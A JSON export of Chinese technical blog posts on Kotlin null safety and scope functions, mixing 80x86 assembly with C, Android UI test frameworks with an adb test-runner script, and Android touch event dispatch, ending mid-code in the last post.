图灵奖得主托尼·霍尔把Null这个设计称为十亿美元错误：“它导致了数不清的错误、漏洞和系统崩溃，可能在之后 40 年中造成了十亿美元的损失” Java中，引入了@NonNull和@Nullable注解辅助进行静态检查，有局限性。 Java8引入Optional&lt;&gt;来解决这个问题，写起来比较恶心，难以推广。 Kotlin希望在语言层面去解决这个问题-&gt;引入Nullable类型概念： 声明为非空的变量永远都不会为空 声明为可空的变量使用时必须判空 利用推断来提高效率12var nonnull: String = \"must be inited with object\"var nullable: String? = null 在语法层面做了诸多改进：123456val l = s?.length // s != null, l = s.length else l = null, l: Int?val l = s!!.length // same as l = s.length in java, l: Intval l = s?.length ?: 0 // s != null, l = s.length else l = 0, l: Intreturn myValue ?: -1// 链式使用：bob?.department?.head?.name // 任一为null不执行 推断的作用（智能转换）：1234567891011121314151617// b: String?if (b != null &amp;&amp; b.length &gt; 0) &#123; // b: String here print(\"length $&#123;b.length&#125;\")&#125; else &#123; print(\"Empty string\")&#125;fun getStringLength(obj: Any): Int? &#123; if (obj is String) &#123; // automatically cast to `String` return obj.length &#125; // `obj` is still of type `Any` outside of the type-checked branch return null&#125; 如果被Java调用，由于Java无法保证非空（除非已经使用@NonNull注解注明），从Java接收的参数必须是可空的。 实际使用中，使得定义变量时必须要考虑是否可为空的问题，在一开始时如果不适应这种思维，可能会滥用可空类型，给调用带来麻烦。 举个例子：1234567891011class MyFragment : Fragment() &#123; private var manager: MyAPIManager? = null @Override public void onCreate(savedInstanceState: Bundle?) &#123; super.onCreate(savedInstanceState) manager = MyAPIManager(context) manager.authorize() &#125;&#125;这里第二行中，由于Kotlin要求我们必须为属性赋予一个初值，但这里的初始化需要用到后面传入的context，按照Java的思维习惯，这个地方很容易就直接把类型改成可空的，然后给了个null的初值，但是这其实违背了Kotlin提供的特性： 我们知道其实这个manager对象一旦被初始化之后就不会再为空，所以这应当是个非空类型 同时我们为了后面去初始化它把它设成了var，实际上它并不应当被重新赋值，所以这应当是个val对象 Kotlin为我们提供了解决问题的方法： 懒属性（Lazy Property）当这个属性第一次被使用前再执地初始化代码，代码如下：123456789101112class MyFragment : Fragment() &#123; private val manager: MyAPIManager by lazy &#123; MyAPIManager(context) &#125; @Override public void onCreate(savedInstanceState: Bundle?) &#123; super.onCreate(savedInstanceState) manager.authorize() &#125;&#125; 懒初始化属性（Lateinit Property）在随后某个确定的时刻初始化，如果在使用时尚未被初始化，会抛出一个未初始化的运行时错误（与NPE略微不同），代码如下：1234567891011class MyFragment : Fragment() &#123; lateinit var manager: MyAPIManager @Override public void onCreate(savedInstanceState: Bundle?) &#123; super.onCreate(savedInstanceState) manager = MyAPIManager(context) manager.authorize() &#125;&#125; 但这时manager仍是一个var，美中不足。 使用这样的机制可以确保这个对象的可空性满足我们的预期，也就是说经过这样的处理的对象，在Kotlin中永远不会报NPE。而确实可为空的对象，我们利用?表达式结合合适的默认值，是可以把NPE消灭的。 但没有NPE是一件好事吗？错误可能会因默认值变得隐含，虽然不会导致Crash，但给定位bug增加了一定难度。 Kotlin也提供了报NPE的办法：使用!!。 何时用，用哪个？ lateinit只用于var，而lazy只用于val。如果是值可修改的变量（即在之后的使用中可能被重新赋值），使用lateinit模式 如果变量的初始化取决于外部对象（例如需要一些外部变量参与初始化），使用lateinit模式。这种情况下，lazy模式也可行但并不直接适用。 如果变量仅仅初始化一次并且全局共享，且更多的是内部使用（依赖于类内部的变量），请使用lazy模式。从实现的角度来看，lateinit模式仍然可用，但lazy模式更有利于封装初始化代码。 不考虑对变量值是否可变的控制，lateinit模式是lazy模式的超集，你可以在任何使用lazy模式的地方用lateinit模式替代, 反之不然。lateinit模式在函数中暴露了太多的逻辑代码，使得代码更加混乱,所以推荐使用lazy，更好的封装了细节，更加安全。 https://kotlinlang.org/docs/reference/null-safety.html https://dev.to/adammc331/understanding-nullability-in-kotlin https://stackoverflow.com/questions/35723226/how-to-use-kotlins-with-expression-for-nullable-types https://medium.com/@agrawalsuneet/safe-calls-vs-null-checks-in-kotlin-f7c56623ab30 函数、扩展方法、Lambda表达式函数像其他函数式语言一样，成为了“一等公民” 函数可以在任意地方声明（类外部，甚至是在函数内部） 函数可以像对象一样通过参数传递：1234fun dfs() &#123;&#125;val f = ::dfsf(graph) 函数参数终于\b可以有缺省值了（不用Builder了）：12345678910fun reformat(str: String, normalizeCase: Boolean = true, upperCaseFirstLetter: Boolean = true, divideByCamelHumps: Boolean = false, wordSeparator: Char = ' ') &#123; // do something&#125;reformat(str)reformat(str, wordSeparator = ' ') // 可以使用参数的名字给缺省参数赋值// 可以通过@JvmOverloads注解生成Java的重载形式便于Java来调用 扩展方法 比如说，给别人的View加一个功能，给定一个资源Id，去取得它对应的资源：1234567// 写一个Util类，作为参数传进去public class ViewUtils &#123; public static int findColor(View view, int resId) &#123; return view.getResources().getColor(resId); &#125;&#125;ViewUtils.findColor(view, resId);通过扩展方法来解决：12345fun View.findColor(id: Int) : Int &#123; return this.resources.getColor(id)&#125;view.findColor(resId) 一\b系列这种类型的Java工具类在Kotlin中被“改造”成了扩展方法例如： Collection.sort(list)在Kotlin中直接list.sort()就可以了。 可以完全取代以往的Util类。 Kotlin提供的作用域扩展函数\b语法简洁，逻辑连贯的最主要体现。 let/run 对象作为参数传入lambda（run则作为this） 返回值为lambda表达式的返回值 常见场景： 转换类型 处理nullable类型 1234val length = s?.let &#123; doSomething(it) it.length&#125; ?: 0 123456789101112131415161718// if...else...写法private fun testIfElse(): Object? &#123; return if (a !== null) &#123; val b = handleA(a) if (b !== null) &#123; handleB(b) &#125; else &#123; null &#125; &#125; else &#123; null &#125;&#125; // ?.let写法private fun testLet(): Object? &#123; return a?.let &#123; handleA(it) &#125;?.let &#123; handleB(it) &#125;&#125; apply 对象作为this传入lambda 返回值为对象本身 常见场景： 初始化对象1234567891011// old way of building an objectval andre = Person()andre.name = \"andre\"andre.company = \"Viacom\"andre.hobby = \"losing in ping pong\"// after applying 'apply' (pun very much intended)val andre = Person().apply &#123; name = \"Andre\" company = \"Viacom\" hobby = \"losing in ping pong\"&#125; 123456return itemView.animation_like.apply &#123; imageAssetsFolder = \"images_feedcell/\" loop(false) setAnimation(\"like_small.json\") setOnClickListener(onClickListener)&#125; also 对象作为参数传入lambda 返回值为对象本身 常见场景： 链式调用中的副作用12345678// transforming data from api with intermediary variableval rawData = api.getData()Log.debug(rawData)rawData.map &#123; /** other stuff */ &#125;// use 'also' to stay in the method chainsapi.getData() .also &#123; Log.debug(it) &#125; .map &#123; /** other stuff */ &#125; takeIf/takeUnless 对象作为参数传入lambda 返回值为对象本身或null（根据lambda中语句的true or false） 常见场景： 链式调用形式的条件判断12val outFile = File(outputDir.path).takeIf &#123; it.exists() &#125; ?: return false 混合使用举例：123456789101112131415161718// if...else...写法private fun testIfElse(): Object? &#123; return if (a !== null) &#123; val b = handleA(a) if (b !== null) &#123; handleB(b) &#125; else &#123; null &#125; &#125; else &#123; null &#125;&#125; // ?.let写法private fun testLet(): Object? &#123; return a?.let &#123; handleA(it) &#125;?.let &#123; handleB(it) &#125;&#125; 简洁，避免大量判空if的使用1234567File(url).takeIf &#123; it.exists() &#125; ?.let &#123; JSONObject(NetworkUtils.postFile(20 * 1024, \"http://i.snssdk.com/2/data/upload_image/\", \"image\", url)) &#125;?.takeIf &#123; it.optString(\"message\") == \"success\" &#125; ?.let &#123; post(content, contact, it.optJSONObject(\"data\")?.optString(\"web_uri\")) &#125; ?: mHandler.post &#123; view?.onFail() &#125; 可以将逻辑划分清楚，直观，避免判空打断思路。123456789101112131415161718192021fun getMessages(context: Context, cursor: Int, direction: Int): ModelResult&lt;MessageResponse&gt; &#123; return UrlBuilder(LOAD_NOTIFY) .apply &#123; addParam(\"cursor\", cursor) addParam(\"direction\", direction) &#125;.let &#123; queryDataFromServer(it.build()) &#125;?.let &#123; val statusCode = it.optInt(\"status_code\", -1) val statusMessage = it.optString(\"status_message\") if (statusCode == 0) &#123; MessageParser.parseMessageList(it.optString(\"data\")) ?.let &#123; ModelResult(true, statusMessage, it) &#125; ?: ModelResult&lt;MessageResponse&gt;() &#125; else &#123; &#125; &#125; ?: ModelResult&lt;MessageResponse&gt;())&#125; 同样是划分逻辑，更加清晰？（需要适应） 附图一张： https://medium.com/@elye.project/using-kotlin-takeif-or-takeunless-c9eeb7099c22 https://proandroiddev.com/the-tldr-on-kotlins-let-apply-also-with-and-run-functions-6253f06d152b https://proandroiddev.com/the-difference-between-kotlins-functions-let-apply-with-run-and-else-ca51a4c696b8 Lambda表达式本质上是一个匿名方法（单方法接口）123456789fun isGreaterThanZero(n: Int): Boolean &#123; return n &gt; 0&#125;collection.filter(::isGreaterThanZero)// 使用Lambdacollection.filter&#123; i: Int -&gt; i &gt; 0 &#125;collection.filter&#123; i -&gt; i &gt; 0 &#125;collection.filter&#123; it &gt; 0 &#125;单方法接口都可以传Lambda：12345678button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; showToast(); &#125;&#125;);button.setOnClickListener&#123; showToast() &#125;内置常用的流处理Lambda：12345names .filter&#123; it.startsWith(\"A\") &#125; .sortedBy&#123; it &#125; .map&#123; it.toUpperCase() &#125; .forEach&#123; print(it) &#125;配合Rxjava使用更佳（也有Rxkotlin）。 在Android上官方提供的扩展 View Binding全自动，无需声明，无需findViewById，直接使用layout id就行1text_view.text = \"text\" @Parcelable 注解一个注解自动实现Parcelable， 仍在实验阶段 异步1234567// uiThread如果是Activity isFinish = true是不会调用的doAsync &#123; print(\"其他线程\") uiThread &#123; print(\"UI线程\") &#125;&#125; Gradle DSL https://docs.gradle.org/current/dsl/index.html 其他黑科技 没有必检异常了 支持运算符重载（String的比较可以用==了） 接口可以有缺省方法 Object Class单例 Data Class数据类型，自动实现equals/hashCode/toString 协程（没用过） 伴生对象 Anko扩展 https://www.jianshu.com/p/9f720b9ccdea https://www.tuicool.com/articles/aEbeayN https://github.com/android/android-ktx https://github.com/adisonhuang/awesome-kotlin-android 其他开源库 与Java协作结论：100%协同，Kotlin调Java没有问题，Java调Kotlin会有些绕，但不会出问题。 性能对比运行性能来源：https://blog.dreamtobe.cn/kotlin-performance/ 性能相比Java更差相关 对varargs参数展开，Kotlin比Java慢1倍，主要原因是在Kotlin在展开varargs前需要全量拷贝整个数组，这个是非常高的性能开销。 对Delegated Properties的应用，Kotlin相比Java慢10%。 性能相比Java更优相关 对Lambda的使用，Kotlin相比Java快30%，而对用例中的transaction添加inline关键字配置内联后，发现其反而慢了一点点(约1.14%)。 Kotlin对companion object的访问相比Java中的静态变量的访问，Kotlin与Java差不多快或更快一点。 Kotlin对局部函数(Local Functions)的访问相比Java中的局部函数的访问，Kotlin与Java差不多快或更快一点。 Kotlin的非空参数的使用相比没有使用空检查的Java，Kotlin与Java差不多快或更快一点。 Kotlin自身比较 对于基本类型范围的使用，无论是否使用常量引用还是直接的范围速度都差不多。 对于非基本类型范围的使用，常量引用相比直接的范围会快3%左右。 对于范围遍历方式中，for循环方式无论有没有使用step速度都差不多，但是如果对范围直接进行.foreach速度会比它们慢3倍，因此避免对范围直接使用.foreach。 在遍历中使用lastIndex会比使用indices快2%左右。 包大小标准库大小100k左右。 新建标准工程（不带Kotlin支持），开启混淆，打release包。 将这个工程文件转为Kotlin实现，引入Kotlin支持，打release包，对比大小： 增加了约109k 将某\b应用一个module转换为Kotlin实现（直接使用AS的工具转换），对比编译生成的所有class文件大小： 增加了约2%的体积。 https://discuss.kotlinlang.org/t/kotlin-generated-class-file-out-of-kt-is-bigger-than-java-file/1520/4 https://blog.dreamtobe.cn/2016/11/30/kotlin/ 编译速度冷编译会慢一些，由于增量编译的存在，热编译速度比Java快。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"Kotlin","slug":"Kotlin","permalink":"https://www.viseator.com/tags/Kotlin/"}]},{"title":"80x86下汇编与C语言的混合编程","date":"2018-07-02T09:30:05.000Z","path":"2018/07/02/80x86_asm_c/","text":"写在前面在汇编课程中的实验中要求了我们在80x86下实现C语言与汇编代码的混合编程，虽然80x86时代离现代有些久远，但我们仍可以把80x86当作x86的一个简化版本来学习一些重要的概念。 从一个例子开始12345678910111213141516#include &lt;stdio.h&gt;extern int test_fun(void *param);extern int var_from_asm;int global_init = 10;int global;static int static_init = 1000;static int static_var;char *string = \"test string\";int main() &#123; int value = 666; test_fun(&amp;value); printf(\"var from asm:%d\\n\", var_from_asm); printf(\"assign from asm:%d\\n\", global); printf(\"value passed by stack:%d\\n\", global_init); return 0;&#125; 可以看到我们在C语言中分别定义了几种类型的变量：初始化过的全局变量、未初始化的全局变量、初始化过的静态变量、未初始化的静态变量与字符串。定义这些变量是为了查看编译后各变量所处的数据段与存放形式。 同时也声明了一个外部函数test_fun()与一个外部变量var_from_asm，用来测试C语言对asm声明的符号的引用。 现在我们编译这个C语言文件到汇编文件，使用TC2.0的命令行工具tcc，使用-S参数，即可在同目录生成同名的ASM文件： 我们打开文件，删除一些debug信息后的结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112_TEXT segment byte public &#39;CODE&#39;_TEXT endsDGROUP group _DATA,_BSS assume cs:_TEXT,ds:DGROUP_DATA segment word public &#39;DATA&#39;_DATA ends_BSS segment word public &#39;BSS&#39;_BSS ends_DATA segment word public &#39;DATA&#39;_global_init label word db 10 db 0static_init label word db 232 db 3_string label word dw DGROUP:s@_DATA ends_TEXT segment byte public &#39;CODE&#39; ; ; int main() &#123; ; assume cs:_TEXT_main proc near push bp mov bp,sp sub sp,2 ; ; int value &#x3D; 666; ; mov word ptr [bp-2],666 ; ; test_fun(&amp;value); ; lea ax,word ptr [bp-2] push ax call near ptr _test_fun pop cx ; ; printf(&quot;var from asm:%d\\n&quot;, var_from_asm); ; push word ptr DGROUP:_var_from_asm mov ax,offset DGROUP:s@+12 push ax call near ptr _printf pop cx pop cx ; ; printf(&quot;assign from asm:%d\\n&quot;, global); ; push word ptr DGROUP:_global mov ax,offset DGROUP:s@+29 push ax call near ptr _printf pop cx pop cx ; ; printf(&quot;value passed by stack:%d\\n&quot;, global_init); ; push word ptr DGROUP:_global_init mov ax,offset DGROUP:s@+49 push ax call near ptr _printf pop cx pop cx ; ; return 0; ; xor ax,ax jmp short @1@58@1@58: ; ; &#125; ; mov sp,bp pop bp ret _main endp_TEXT ends_BSS segment word public &#39;BSS&#39;static_var label word db 2 dup (?)_global label word db 2 dup (?)_BSS ends_DATA segment word public &#39;DATA&#39;s@ label byte db &#39;test string&#39; db 0 db &#39;var from asm:%d&#39; db 10 db 0 db &#39;assign from asm:%d&#39; db 10 db 0 db &#39;value passed by stack:%d&#39; db 10 db 0_DATA ends_TEXT segment byte public &#39;CODE&#39;_TEXT ends public _main public _string_static_var equ static_var_static_init equ static_init public _global public _global_init extrn _var_from_asm:word extrn _test_fun:near extrn _printf:near_s@ equ s@ end 首先可以发现几个数据段： 123_TEXT segment byte public &#39;CODE&#39;_DATA segment word public &#39;DATA&#39;_BSS segment word public &#39;BSS&#39; 是不是很熟悉？虽然是80386，但是现代ELF中仍可以见到这几个节的身影。DGROUP group _DATA,_BSS DGROUP表示_DATA与_BSS段合成的段标号。分析这几个段中的内容，可以发现_TEXT段即运行时的CS段，存放着代码。_DATA段中存放着下列内容： 12345678_global_init label word db 10 db 0static_init label word db 232 db 3_string label word dw DGROUP:s@ 前两个即已经初始化的全局变量与静态变量。第三个是一个别名，找到它的定义： 123456789101112s@ label byte db &#39;test string&#39; db 0 db &#39;var from asm:%d&#39; db 10 db 0 db &#39;assign from asm:%d&#39; db 10 db 0 db &#39;value passed by stack:%d&#39; db 10 db 0 我们不但在s@处发现了字符串常量test string，而且发现这里存放着printf中使用的格式化字符串。 _BSS（意为Block Started by Symbol）中存放着为尚未初始化或初始化为零的全局或静态变量预留的空间，在这里，它存放着如下内容： 1234static_var label word db 2 dup (?)_global label word db 2 dup (?) 你可能已经发现，我们在C语言中定义的变量在生成的汇编代码中被加上了下划线前缀，其实不光是变量名，函数名也会被编译器做相同的处理： 1_main proc near 在文件的末尾还有如下内容： 12345678910 public _main public _string_static_var equ static_var_static_init equ static_init public _global public _global_init extrn _var_from_asm:word extrn _test_fun:near extrn _printf:near_s@ equ s@ 可以看到使用public关键字声明了全局变量string、global、global_init与函数main，以便外部去引用他们。同时也使用extrn关键字声明了外部定义的_var_from_asm、_test_fun、_printf，在链接时会解析这些标记完成偏移地址的修改。 到这里我们已经分析完了test.c编译后的内容。 下面是测试使用的汇编程序t.asm： 1234567891011121314151617181920212223242526public _test_funpublic _var_from_asmextrn _global:byte, _global_init:byte_DATA segment use16 word public &#39;DATA&#39; _var_from_asm label word db 10 db 0_DATA ends_TEXT segment use16 byte public &#39;CODE&#39; assume CS:_TEXT, DS:_DATA_test_fun proc near push bp mov bp, sp push di mov ax, 6[bp] mov word ptr _global_init, ax mov word ptr _global, 100 pop di pop bp ret_test_fun endp_TEXT endsend 程序比较简单，在头部同样地声明了对外的符号与引用的外部的符号。 同时，为了实现与C程序的相互引用，我们使用相同的标识定义了_DATA段与_TEXT段，为了使C语言可以以var_from_asm的形式使用汇编中定义的变量，所以在_DATA段中使用_var_from_asm声明了两个字节并初始化为10的空间。 同理，在_TEXT段中使用_test_fun作为子程序名定义了函数test_fun。 而在test_fun中，我们先将bp入栈，将sp赋给bp后，将bp+6位置的值赋给了ax，在函数调用的时候，会先将参数入栈，然后将CS与IP入栈，占用了4个字节的栈空间，函数内调用push bp又占用了2个字节的栈空间，所以传入的参数应该在bp+6的位置上。我们将这个参数值写回到C语言定义的全局变量_global_init中，下一行将_global赋上了100。 现在，就可以进行编译链接步骤了。 一般地，我们可以使用C编译器编译test.c生成目标文件，使用TASM汇编编译器编译t.asm生成目标文件，再使用tlink将生成的目标文件与库提供的目标文件进行链接，但是这样做略显麻烦，tcc会调用TASM编译汇编文件，也会将生成的目标文件和库文件一起链接并生成最后的可执行文件，所以我们只要简单地执行tcc test.c t.asm就可以了。 直接运行生成的test.exe，查看结果：","tags":[{"name":"Assembly","slug":"Assembly","permalink":"https://www.viseator.com/tags/Assembly/"}]},{"title":"Android UI自动化测试技术选择与踩坑","date":"2018-02-09T09:56:57.000Z","path":"2018/02/09/android_ui_test/","text":"写在前面在官方文档关于测试一节中，介绍了测试金字塔这一概念：即我们应该包括三个层次的测试：小型、中型、与大型： 小型测试是单元测试，即可以独立运行在每个模块上的测试。它们通常模拟了每个主要的组件并且应该快速地运行。 中型测试是介于大型与小型测试之间的综合测试，它们集成了数个组件并且运行在模拟器或实机上。 大型测试是以模拟UI工作流方式进行的综合UI测试，它们保证了关键的终端用户的使用可以符合我们的预期。虽然小型测试迅速并且专注，可以让我们很快地发现错误，但它们同样是低仿真且自成一体的，这使得我们很难保证通过了所有的单元测试就可以成功地让App运行。而大型测试的优缺点恰恰与上述相反。由于每个层次的测试的角色各不相同，我们应该进行所有这三个层次的测试，尽管各个层次使用比例需要根据App的使用特点，通常建议三个测试的比例为1:2:7。UI自动化测试即属于上面说的大型测试。 测试框架功能对比概览参考： https://stackoverflow.com/questions/20046021/google-espresso-or-robotium实际测试编写体验实际的编写中，主要的步骤可以总结为三步： 如何定位想要操作的View 如何施加想要进行操作 如何判断App的行为符合我们预期三种框架都为我们提供了一系列方法，但细节与效果略有不同： Espresso 白盒测试，体现在可以直接拿到显示中的View实例，拿到WebView DOM树中的Element 一般场景下，区分度较为明显的View(有唯一的id tag)等，可以通过多种途径定位，较为便捷 面对特殊场景：如TabLayout中的Tab时，由于它们拥有相同的类型与id，难以定位view 出现多窗口情况（如dialog），可以正常处理 不能触发按返回键、改变屏幕方向等操作 UI Automator 黑盒测试，体现在无法拿到具体的View，只能拿到基类(LinearLayout等)，无法看到WebView的DOM树 一般场景下，定位View没有差别 面对特殊场景，可以通过找出所有符合条件的View再按索引找到想要的View 出现多窗口情况：处理出现异常 Robotium 集合了上述框架的优点，既可以拿到显示中的View实例与WebView的DOM树 对上述框架的接口进行了统一，调用比较方便最终框架选择通过上述比较，可以看到Robotium在满足我们要求的同时统一了接口，故选择Robotium作为使用的框架。使用过程中踩的一些大坑变量必须使用static在AndroidTest类中，期望使用一个boolean标志来判断是否已经登陆过（避免重复检查登陆状态），发现在login()方法中置标志为true后进入下一个测试时这个值仍为false，推测运行测试方法时各个方法的运行是独立的，故不使用静态变量则无法保存状态。等待引发的问题等待？在我们对View进行一个操作以后，框架会自动处理下一步动作触发的时机，比如点击一个Tab后，会自动等待下一个页面出现再执行下面的操作。这个等待判断的原理没有看过源码不能确定，但是实际中遇到比如WebView加载页这样等待时间较长的页面，就会触发下一个操作的执行。那么问题就出现了，如果想要进行这样的测试：点击打开一个文档，等待文档打开完毕以后检查标题是否是我们打开的文档，如果在文档没有加载完的时候就执行检查步骤，就会产生Element not found的错误。解决方法 强行设置等待时间利用SystemClock.sleep()方法强行让测试暂停一段时间，这个方法比较暴力也不优雅，不到万不得已不要使用。 使用Robotium提供的各种wait方法，通过设置退出条件来等待：1234567891011121314private void waitForWebView() &#123; assertTrue(mSolo.waitForCondition(new Condition() &#123; @Override public boolean isSatisfied() &#123; View loading = null; try &#123; loading = mSolo.getView(R.id.loading); &#125; catch (AssertionFailedError e) &#123; Log.e(TAG, e.getMessage()); &#125; return null == loading || View.GONE == loading.getVisibility(); &#125; &#125;, DOC_LOAD_TIMEOUT));&#125; 在解决上面的问题的时候就使用了上面的代码来等待WebView文档加载完毕，返回true时条件满足，退出等待，若超时，则方法返回false，assert失败表示doc加载超时。此处的判断方法是等待loading隐藏。123456private void waitForActivity(Class&lt;? extends Activity&gt; activity) &#123; if (mSolo.getCurrentActivity().getClass() == activity) &#123; return; &#125; assertTrue(mSolo.waitForActivity(activity));&#125; 上述代码是为了等待activity启动，可以用于判断新的activity是否正常启动。跨进程引发的问题在应用中，打开的文档运行在一个新的进程中，在使用Espresso的时候就遇到了问题：无法拿到新进程中WebView的信息，原因没有仔细分析，但可以确定是跨进程的问题。在Robotium中这个问题同样存在。不但如此，多进程还会导致当前activity的判断出错，本应判断在DocActivity中，但实际上得到的是在原进程的activity中。在多种方法尝试无果后，只能暂时修改源码，将doc放在同进程打开。View获取的问题获取想要的View是编写用例最主要的难点所在，在获取View的时候也遇到了不少的坑：重复出现的View实际上通过getCurrentViews()获取到的View对象包括所有activity的所有View，比如主页面有3个tab，每个tab中有一个RecyclerView，这三个RecyclerView都是可以被获取到的（而不是想象中的只获取到当前可见的这个），甚至在打开新的activity后，后台的activity中的RecyclerView还是可以被获取到的。但是使用getView()方法获取的范围是当前activity。这意味着什么呢？如果这些RecyclerView有相同的id，使用getView(int id)方法获取到的只是第一个，即使切到了第二个tab，获取到的还是第一个tab中的RecyclerView。面对这个情况我们可以用三种方法： 如果它们id不同，使用getView(int id)就可以拿到特定的。如果id相同，可以传入第二个index参数来获取同id的第n个实例 使用getView(类名, int index)拿到该类所有实例中的第n个，因为各个RecyclerView加载的顺序是相对固定的，所以每次运行拿到的RecyclerView是同一个。拿上面的例子来说，如果要拿到第二个tab中的RecyclerView，要获取的应该是第2个。 先获取它的任意一个ParentView，然后通过getCurrentViews(类名，ViewGroup)方法拿到List，如果ViewGroup是唯一的，这个List中应该只会有我们想要的那个，也可以用ViewGroup来缩小我们搜索的范围。View获取的技巧总结一下 定位View最为方便的就是使用getView(int id/类名)这个方式，如果id/类名的实例唯一，就可以直接拿到。 如果同id/类名有很多个view存在，要使用getView(int id/类名, int index)，拿到第n个view实例。 如果该view所处的任一个ViewGroup很好获取（有唯一id/类名），可以通过getCurrentViews(类名, ViewGroup)这个方式迅速缩小范围，拿到想要的View。RecyclerView中获取ViewHolderRobotium允许我们直接拿到View对象，所以我们可以直接使用RecyclerView的findViewHolderForAdapterPosition()方法去拿ViewHolder，但是事情并没有这么简单，我们知道RecyclerView的特点是没有在屏幕上显示的ViewHolder是没有被实例化的，这样拿到的会是null，所以为了拿到所有ViewHolder我们还需要使用scrollDownRecyclerView()方法让RecyclerView滚动起来，但是使用这个方法还会有问题，有时候它会失效（怀疑是没有完成滚动就执行了下一条语句），所以还需要在调用这个方法之后设一个延迟（100ms就行），样例代码如下：1234567891011for (int i = 0; i &lt; listAdapter.getItemCount(); i++) &#123; RecyclerView.ViewHolder viewHolder = recyclerView.findViewHolderForAdapterPosition(i); if (null == viewHolder) &#123; mSolo.scrollDownRecyclerView(0); SystemClock.sleep(100); viewHolder = recyclerView.findViewHolderForAdapterPosition(i); &#125; if (testAction.test(listAdapter, viewHolder, i)) &#123; break; &#125;&#125; WebView中的WebElement获取需要延迟之前介绍了等待WebView加载的方法，但是实际上这个方法返回后通过getWebElements()拿到的WebElements是空的，实际上想要拿到WebElement还要等待几秒种的时间。输入字符的问题直接输入字符的方法123private void inputString(String text) &#123; InstrumentationRegistry.getInstrumentation().sendStringSync(text);&#125; 会把string拆分成按键序列输入。丢失字符的问题调用上面的方法输入的字符过长的时候会偶发出现字符丢失的问题，暂时不知道解决方法，只能输入短一点的字符。方法调用顺序的问题写在AndroidTest文件夹下同一个测试类中的各个方法的调用顺序是未知的，而且没有找到好的办法可以直接在内部决定它们的调用顺序，本来这并不是一个大问题，但是在写测试的过程中出现了一个比较致命的问题：连续打开WebView会导致WebView无法加载。这个问题应该是由于复用了WebView或者loading view的判断出了问题导致的。单独单次地运行单个测试方法并不会出现这个问题，所以考虑转而使用手写测试脚本 的方式来决定方法的调用顺序并且单次地运行单个测试方法。同时脚本还应该支持重新编译测试Apk并且安装到\b手机，并且可以指定测试的方法与执行顺序。最终编写完成的脚本如下：1234567891011121314151617181920212223242526#!/bin/bashfunction rebuild_install() &#123; ./gradlew --build-cache :app:assemblePublishxxxDebug :app:assemblePublishxxxDebugAndroidTest adb push app/build/outputs/apk/publishxxx/debug/app-publish-xxx-debug.apk /data/local/tmp/com.xxx.xx.xxxx adb shell pm install -t -r \"/data/local/tmp/com.xxx.xx.xxxx\" adb push app/build/outputs/apk/androidTest/publishxxx/debug/app-publish-xxx-debug-androidTest.apk /data/local/tmp/com.xxx.xx.xxxx adb shell pm install -t -r \"/data/local/tmp/com.xxx.xx.xxxx\"&#125;cd ..if [ -n \"$1\" ] &amp;&amp; [ \"$1\" = rebuild ]then rebuild_installelse echo Not Rebuildfitest_funcs=($(awk '&#123;print $0&#125;' ui_test/funtion_names.txt))for funcs in $&#123;test_funcs[@]&#125;do echo ┌-------------------------------------- echo Start $funcs adb shell am force-stop com.xxx.xx.xxxx adb shell am instrument -w -r -e debug false -e class com.xxx.xx.xxxx.MainInstrumentedTest#$funcs com.xxx.xx.xxxx.test/android.support.test.runner.AndroidJUnitRunner | sed -En -e '/There was/,/FAILURES/p;/OK/p' echo └--------------------------------------done \u001f需要测试的方法按顺序放在funtion_names.txt文件中：1234checkLogoutcheckNewDoccheckCreateDoccheckOpenShare 在使用时可以传入rebuild参数来重新构建并安装，未传入可以直接开始测试：12./test.sh rebuild // 重新构建并安装./test.sh //直接测试 运行结果示例：1234567891011121314151617Not Rebuild┌--------------------------------------Start checkLogoutOK (1 test)└--------------------------------------┌--------------------------------------Start checkNewDocOK (1 test)└--------------------------------------┌--------------------------------------Start checkCreateDocOK (1 test)└--------------------------------------┌--------------------------------------Start checkOpenShareOK (1 test)└--------------------------------------","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"Test","slug":"Test","permalink":"https://www.viseator.com/tags/Test/"}]},{"title":"Android 触摸事件分发机制（三）View触摸事件分发机制","date":"2017-11-02T13:33:31.000Z","path":"2017/11/02/android_view_event_3/","text":"View触摸事件分发经过前面的两篇文章，我们终于从内核（触摸事件的真正来源）一路经过Native层通过消息机制来到了需要接收的应用的主线程消息队列中然后被处理，首先调用的是应用根View（DecorView)的dispatchPointerEvent()方法（继承自View）： 1234567public final boolean dispatchPointerEvent(MotionEvent event) &#123; if (event.isTouchEvent()) &#123; return dispatchTouchEvent(event); &#125; else &#123; return dispatchGenericMotionEvent(event); &#125;&#125; 调用了ViewGroup的dispatchTouchEvent()方法（DecorView继承自FrameLayout）： dispatchTouchEvent(ViewGroup)顾名思义，这个方法就是ViewGroup的触摸事件分发方法，它重写了父类View的该方法，View也有自己的dispatchTouchEvent()方法（后面再讲）。 这个方法非常长，我们拆开来分析，首先我们要明确一点，由于Android在系统级别引入了辅助功能选项（AccessibilityFoucs）来帮助有障碍的用户使用系统，所以如果一个事件带有TargetAccessibilityFocus标志，说明这是一个特殊的辅助功能事件，需要进行特殊处理（虽然这种情况比较少见）。 12345678910111213141516171819202122232425262728293031323334353637383940 @Override public boolean dispatchTouchEvent(MotionEvent ev) &#123; // 如果是辅助功能事件，并且当前view是目标view，那么取消标志，进行普通分发if (ev.isTargetAccessibilityFocus() &amp;&amp; isAccessibilityFocusedViewOrHost()) &#123; ev.setTargetAccessibilityFocus(false); &#125; boolean handled = false;// 安全原因检查触摸事件 if (onFilterTouchEventForSecurity(ev)) &#123; final int action = ev.getAction(); final int actionMasked = action &amp; MotionEvent.ACTION_MASK; // 如果事件类型是按下，清除之前的处理，重新开始处理触摸动作 if (actionMasked == MotionEvent.ACTION_DOWN) &#123; cancelAndClearTouchTargets(ev); resetTouchState(); &#125; // 拦截标志（重要） final boolean intercepted; // 如果是按下事件（新的触摸动作），或者已经存在处理事件的子View if (actionMasked == MotionEvent.ACTION_DOWN || mFirstTouchTarget != null) &#123; // 检查是否不允许拦截事件（requestDisallowInterceptTouchEvent(true)被调用的情况） final boolean disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != 0; if (!disallowIntercept) &#123; // 调用onInterceptTouchEvent方法确定是否拦截事件（后面讲） intercepted = 